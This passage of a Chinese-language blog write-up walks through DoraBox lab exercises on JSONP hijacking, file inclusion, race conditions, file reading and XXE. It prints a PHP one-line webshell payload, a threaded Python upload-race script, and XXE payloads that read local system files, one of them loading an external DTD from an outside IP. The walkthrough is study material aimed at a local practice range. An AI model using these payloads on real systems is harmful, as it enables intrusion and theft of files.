class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="dorabox_csrf_ky001.png" alt="">内容：</p>
+</li>
+</ol>
+<h2 id="总结-15"><a class="markdownIt-Anchor" href="#总结-15">#</a> 总结：</h2>
+<pre><code>实话实说，这个就是借鉴网上的，解释一下js代码：
+
+自定义ajax()方法并执行，ajax内创建XMLHttpRequest对象，设置回应内容的类型为text。
+
+然后发送请求到服务器，其中 open(*method*,*url*,*async*)，第三个参数true为异步，异步 JavaScript 和 XML，XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async 参数必须设置为 true。
+
+onreadystatechange：存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。
+</code></pre>
+<ul>
+<li>
+<p>0: 请求未初始化</p>
+</li>
+<li>
+<p>1: 服务器连接已建立</p>
+</li>
+<li>
+<p>2: 请求已接收</p>
+</li>
+<li>
+<p>3: 请求处理中</p>
+</li>
+<li>
+<p>4: 请求已完成，且响应已就绪</p>
+<p>status	<br>
+200: “OK”，404: 未找到页面</p>
+</li>
+</ul>
+<p>最后响应成功就 alert 返回的数据</p>
+<p>function ajax() {<br>
+var xhr = new XMLHttpRequest();<br>
+xhr.responseType = “text”;<br>
+xhr.open(‘GET’, ‘<a target="_blank" rel="noopener" href="http://localhost/dorabox/csrf/userinfo.php">http://localhost/dorabox/csrf/userinfo.php</a>’, true);<br>
+xhr.onreadystatechange= function(e) {<br>
+if(this.status == 200){<br>
+alert(this.responseText);<br>
+}<br>
+};<br>
+xhr.send();<br>
+}<br>
+ajax();</p>
+<h1 id="jsonp劫持"><a class="markdownIt-Anchor" href="#jsonp劫持">#</a> JSONP 劫持</h1>
+<p><img src="dorabox_csrf_json001.png" alt=""></p>
+<h2 id="过程-16"><a class="markdownIt-Anchor" href="#过程-16">#</a> 过程：</h2>
+<ol>
+<li>
+<p>来一个 csrf 攻击代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP劫持测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">result</span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">        </span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(result.address);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="dorabox_csrf_json002.png" alt=""></p>
+</li>
+</ol>
+<h2 id="总结-16"><a class="markdownIt-Anchor" href="#总结-16">#</a> 总结：</h2>
+<p>JSONP (JSON With Padding)，是一种特殊的 CSRF 攻击，目的是获取敏感数据，当 JSON 数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将 JSON 数据发送给第三方即攻击者的代码。</p>
+<p>没写过，第一次写，写完跨域好像又多懂了一点点（好像真的懂了，但是入职培训里写的有点详细），我写完这些要再多写几道题，来一点画面感。</p>
+<h1 id="任意文件包含"><a class="markdownIt-Anchor" href="#任意文件包含">#</a> 任意文件包含</h1>
+<p><img src="dorabox_filein002.png" alt=""></p>
+<h2 id="过程-17"><a class="markdownIt-Anchor" href="#过程-17">#</a> 过程：</h2>
+<ol>
+<li>直接文件包含，输出<img src="dorabox_filein003.png" alt=""></li>
+</ol>
+<h2 id="总结-17"><a class="markdownIt-Anchor" href="#总结-17">#</a> 总结：</h2>
+<p>网上看了很多通关记录，可是大家都是直接包含，如果不是本地靶场，那是怎么知道路径以及文件名的呢？是不是要配合文件上传一起？</p>
+<h1 id="任意文件包含-2"><a class="markdownIt-Anchor" href="#任意文件包含-2">#</a> 任意文件包含</h1>
+<p><img src="dorabox_filein002.png" alt=""></p>
+<h2 id="过程-18"><a class="markdownIt-Anchor" href="#过程-18">#</a> 过程：</h2>
+<ol>
+<li>输入 1，发现限制在当前目录，但是不影响要用的文件，所以也是直接包含就可以了<img src="dorabox_filein004.png" alt=""><img src="dorabox_filein003.png" alt=""></li>
+</ol>
+<h2 id="总结-18"><a class="markdownIt-Anchor" href="#总结-18">#</a> 总结：</h2>
+<p>…/ 应该可以突破把</p>
+<h1 id="条件竞争-支付"><a class="markdownIt-Anchor" href="#条件竞争-支付">#</a> 条件竞争 - 支付</h1>
+<p>靶场出了点问题，页面报 php 语法错</p>
+<p>但是语法并没有出错，百度了说是 php 版本的问题，但是我基本每个版本都试过且重启了，但是没有解决</p>
+<p>不过反正这个题要写脚本，我也不太会，干脆跟着把 poc 撸了一遍</p>
+<h2 id="过程-19"><a class="markdownIt-Anchor" href="#过程-19">#</a> 过程：</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    三个变量</span></span><br><span class="line"><span class="string">    url：要测试的网站地址</span></span><br><span class="line"><span class="string">    threads：线程数</span></span><br><span class="line"><span class="string">    q：调用queue构造方法，对列队大小不设限</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&quot;http://localhost/dorabox/race_condition/pay.php&quot;</span></span><br><span class="line">threads=<span class="number">25</span></span><br><span class="line">q=queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在列队中加入50个元素,0-49</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    q.put(i)   </span><br><span class="line"><span class="comment"># 定义post函数，发50个一块钱</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 当q里面还有元素时,就获取元素，发送一个post请求支付一块钱</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        q.get() </span><br><span class="line">        <span class="comment"># Requests以form表单形式发送post请求，支付输入框name是money嘛</span></span><br><span class="line">        <span class="comment"># data = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,...&#125;</span></span><br><span class="line">        r = requests.post(url, data = &#123;<span class="string">&#x27;money&#x27;</span> : <span class="number">1</span>&#125;)</span><br><span class="line">        r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">一个python文件通常有两种使用方法,</span></span><br><span class="line"><span class="string"> 第一是作为脚本直接执行，</span></span><br><span class="line"><span class="string"> 第二是 import 到其他的 python 脚本中被调用（模块重用）执行。</span></span><br><span class="line"><span class="string"> 因此if __name__ == &#x27;main&#x27;: 的作用就是:</span></span><br><span class="line"><span class="string"> 控制这两种情况执行代码的过程，在if __name__ == &#x27;main&#x27;: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 每个python模块（python文件）都包含内置的变量 __name__，当该模块被直接执行的时候，__name__ 等于文件名（包含后缀 .py ）；如果该模块 import 到其他模块中，则该模块的 __name__ 等于模块名称（不包含后缀.py）</span></span><br><span class="line"><span class="string"> 而“__main__” 始终指当前执行模块的名称（包含后缀.py）。进而当模块被直接执行时，__name__ == &#x27;__main__&#x27; 结果为真。</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 那其实就是主函数呗，程序运行入口，不过也有点区别嗷</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 用25个线程，分别发50个一块钱</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads)：</span><br><span class="line">        t = threading.Thread(target=post) <span class="comment"># 目标对象是post函数</span></span><br><span class="line">        t.start() <span class="comment"># 开始执行线程</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="总结-19"><a class="markdownIt-Anchor" href="#总结-19">#</a> 总结：</h2>
+<p>python 代码写的时候，总是爱打分号唉<br>
+感觉大家写脚本或者一些小工具，都喜欢用 python，有点意思</p>
+<p>这里是看代码的时候找资料看见的（后来才发现 python 自带.chw api，不过英文的阅读起来也有点费时间就是了）：</p>
+<ul>
+<li>
+<p>Queue 是 python 标准库中的线程安全的列队 (FIFO) 实现<br>
+提供了一个适用于多线程编程的先进先出的数据结构，即列队<br>
+用来在生产者和消费者线程之间的信息传递</p>
+</li>
+<li>
+<p>class Queue.Queue(maxsize=0)<br>
+ maxsize 是个整数，指明了列队中能存放的个数上限。<br>
+一旦达到上限，插入会导致阻塞，直到列队中的数据被消费掉。<br>
+如果 maxsize 小于或者等于 0，列队大小没有限制</p>
+</li>
+<li>
+<p>Queue,deque,queue 对比：queue 是多线程中的使用的栈，但是 Python 解释器有一个全局解释器锁 (PIL)，<br>
+导致每个 Python 进程中最多同时运行一个线程，<br>
+因此 Python 多线程程序并不能改善程序性能，不能发挥多核系统的优势。</p>
+</li>
+<li>
+<p>multiprocessing.Queue 是 Python 2.6 引入的用来实现多进程的一种高性能栈。</p>
+</li>
+<li>
+<p>collections.deque 是为了高效实现插入和删除操作的双向列表，适合用于队列和栈。</p>
+</li>
+<li>
+<p>queue 实例方法：<br>
+Queue.empty (): 判断队列是否为空。和上面一样注意<br>
+ Queue.full (): 判断是否满了。和上面一样注意<br>
+ Queue.put (item, block=True, timeout=None): 往队列里放数据。如果满了的话，blocking = False 直接报 Full 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能存入，报 Full 异常。<br>
+Queue.put_nowait (item): 往队列里存放元素，不等待<br>
+ Queue.get (item, block=True, timeout=None): 从队列里取数据。如果为空的话，blocking = False 直接报 empty 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能读取，报 empty 异常<br>
+ Queue.get_nowait (item): 从队列里取元素，不等待两个方法跟踪入队的任务是否被消费者 daemon 进程完全消费</p>
+</li>
+</ul>
+<h1 id="条件竞争-上传"><a class="markdownIt-Anchor" href="#条件竞争-上传">#</a> 条件竞争 - 上传</h1>
+<p>看源码顺序：文件上传上来，检查后缀，后缀不在允许列表里，删除文件。</p>
+<p><img src="dorabox_jz_upload001.png" alt=""></p>
+<h2 id="过程-20"><a class="markdownIt-Anchor" href="#过程-20">#</a> 过程：</h2>
+<p>竞争的地方，是先删除还是先执行，关键就在于赶在删除之前执行上传的文件。<br>
+这是我们上传的文件内容，新建一个 info.php 文件，里面写入一句话木马。</p>
+<figure class="highlight php"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;info.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过并发可以实现在上传成功未执行到删除代码的时候，访问执行，生成 info.php。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 父类 threading.Thread</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_</span>(<span class="params">self</span>):</span></span><br><span class="line">        threading.Thread._init_(self)</span><br><span class="line">        self.url = <span class="string">&#x27;http://localhost/dorabox/race_condition/key.php&#x27;</span> <span class="comment"># 马</span></span><br><span class="line">        self.uploadUrl = <span class="string">&#x27;http://localhost/dorabox/race_condition/upload.php&#x27;</span>; <span class="comment"># 搞它</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取上传的马，就是解析执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>: <span class="comment"># 搞到成功就退出</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;create file info.php success.&#x27;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 传马</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;upload file...&#x27;</span>)</span><br><span class="line">        file = &#123;<span class="string">&#x27;myfile&#x27;</span> : <span class="built_in">open</span>(<span class="string">&#x27;attack.php&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)&#125; <span class="comment">#key value的数据，我还以为是啥</span></span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 一直搞</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 其实就外面那个循环不就好了，为啥还要再写一个for啊</span></span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threads = <span class="number">50</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        <span class="comment"># join的原理就是依次检验线程池中的线程是否结束，没有结束就阻塞直到线程结束，如果结束则跳转执行下一个线程的join函数。</span></span><br><span class="line">        t.join() </span><br></pre></td></tr></table></figure>
+<p><img src="dorabox_jz_upload002.png" alt=""></p>
+<h2 id="总结-20"><a class="markdownIt-Anchor" href="#总结-20">#</a> 总结：</h2>
+<p>python 的 self 竟然不是关键字？？？是因为__init__(self) 的时候创建了一个该类的实例，且名字叫 self，所以换成别的字符串，在别的函数里也能用把。</p>
+<p>python 类变量，它的值将在这个类的所有实例之间共享。（还有在_<em>init</em>_() 的时候 self. 变量，这和 java 区别还蛮大的）</p>
+<p>心得就是解题思路真的很重要，因为菜，都没见过，无从下手的感觉太难受了，是不是题目写多了就会有很多思路？希望不要写多了题目思维反而被局限了，还是要多思考。</p>
+<p>最后，这道题真的好帅啊！！！</p>
+<h1 id="任意文件读取"><a class="markdownIt-Anchor" href="#任意文件读取">#</a> 任意文件读取</h1>
+<p>输入…/，发现是可以直接读文件的</p>
+<p><img src="dorabox_readanyfile002.png" alt=""></p>
+<h2 id="过程-21"><a class="markdownIt-Anchor" href="#过程-21">#</a> 过程：</h2>
+<ol>
+<li>直接读取文件<img src="dorabox_readanyfile001.png" alt=""></li>
+</ol>
+<h2 id="总结-21"><a class="markdownIt-Anchor" href="#总结-21">#</a> 总结：</h2>
+<p>这个，emmmm，这样的漏洞，很难找把？（傻喵）</p>
+<h1 id="xxe"><a class="markdownIt-Anchor" href="#xxe">#</a> xxe</h1>
+<p>靶场 php 和 xml 交互的时候报错了，百度没找到解决方案，我太菜了（现在也很菜喔～我们回家摆小摊把 o (￣ε￣*)）</p>
+<p><img src="dorabox_xxe001.png" alt=""></p>
+<h2 id="过程-22"><a class="markdownIt-Anchor" href="#过程-22">#</a> 过程：</h2>
+<ol>
+<li>
+<p>看前端代码，观察到服务端以 xml 的形式接收文件，然后服务器会正常返回客户端在 body 中 post 过去的 xml 代码执行结果</p>
+<p><img src="dorabox_xxe002.png" alt=""></p>
+</li>
+<li>
+<p>构造 xml 文件读取 attack.php</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Sakura</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">&quot;file:///C:/Users/lenovo/Desktop/attack.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>桜桜私はあなたを愛しています<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="总结-22"><a class="markdownIt-Anchor" href="#总结-22">#</a> 总结：</h2>
+<p>xxe 就是外部实体注入嘛，可以一行代码禁用。</p>
+<p>xxe 是由 xml 和 dtd 约束搞出来的东西，我们可以通过文件路径和变量名，回显数据。</p>
+<p>1、 当引用的 DTD 文件是<strong>本地文件</strong>的时候，用 SYSTEM 标识，并写上”DTD 的文件路径”，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>2、 如果引用的 DTD 文件是一个<strong>公共文件</strong>时，采用 PUBLIC 标识，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>1. 内部实体声明</strong></p>
+<!ENTITY 实体名称 "实体的值"> 
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;Thinking&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>2. 外部实体声明</strong></p>
+<!ENTITY 实体名称 SYSTEM "URI/URL"> 
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">copyright</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>login<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上述两种均为引用实体，主要在<strong> XML 文档中</strong>被应用，引用方式：<strong>&amp; 实体名称；</strong> 末尾要带上分号，这个引用将直接转变成实体内容。</p>
+<p><strong>3. 参数实体声明</strong></p>
+<!ENTITY % 实体名称 "实体的值"> 
+<!ENTITY % 实体名称 SYSTEM "URI/URL"> 
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">copyright</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">body</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.runoob.com/entities.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;%body;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>login<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>参数实体，被<strong> DTD 文件</strong>自身使用 ，引用方式为：% 实体名称。和通用实体一样，参数实体也可以外部引用。</p>
+<p>允许<strong>包含外部实体</strong>，就可能存在 XXE 攻击。</p>
+<p><strong>【利用 1】读取本地文件</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>【利用 2】读取含特殊字符的本地文件</strong></p>
+<p>如果文件中含有特殊字符，如 &amp;,&lt;,&gt;,&quot;,' 等，通过上述方法会报错，需要借助 CDATA，CDATA 节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="最后哦"><a class="markdownIt-Anchor" href="#最后哦">#</a> 最后哦</h1>
+<p>小心眼 + 记仇の milkii0，会打败你们的！</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
